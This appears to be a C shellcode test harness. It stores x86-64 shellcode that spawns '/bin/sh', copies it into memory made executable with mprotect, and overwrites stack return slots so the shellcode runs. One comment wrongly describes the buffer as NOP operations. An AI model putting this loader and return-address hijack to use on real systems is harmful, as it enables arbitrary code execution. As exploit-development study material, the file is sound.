#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long *hold;
char shellcode[] =	"\x55\x48\x89\xe5\xeb\x30\x5b\x55"
			"\x48\x89\xe5\x48\x83\xec\x10\x48"
			"\x31\xd2\x48\x89\x5d\xf0\x48\x89"
			"\x55\xf8\x48\x8d\x75\xf0\x48\x8b"
			"\x7d\xf0\x48\x31\xc0\xb0\x3b\x0f"
			"\x05\x48\x31\xc0\xb0\x3c\x48\x31"
			"\xc9\x48\x89\xcf\x0f\x05\xe8\xcb"
			"\xff\xff\xff\x2f\x62\x69\x6e\x2f"
			"\x73\x68\x00";

  //Replace the above shellcode buffer of NOP operations with the hex code for you shell code.
  //NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
 long long *ret;

 hold= (long long *)&ret;
 (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
  hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;
 hold++;
  (*hold)=(long long)cx;

}

void main ()
{
  int pagesize;
  char *buf;

  pagesize = sysconf(_SC_PAGE_SIZE);
  posix_memalign(&buf, pagesize, strlen(shellcode)+10);
  strcpy(buf,shellcode);
  mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
  decoy(buf);
  return;
}
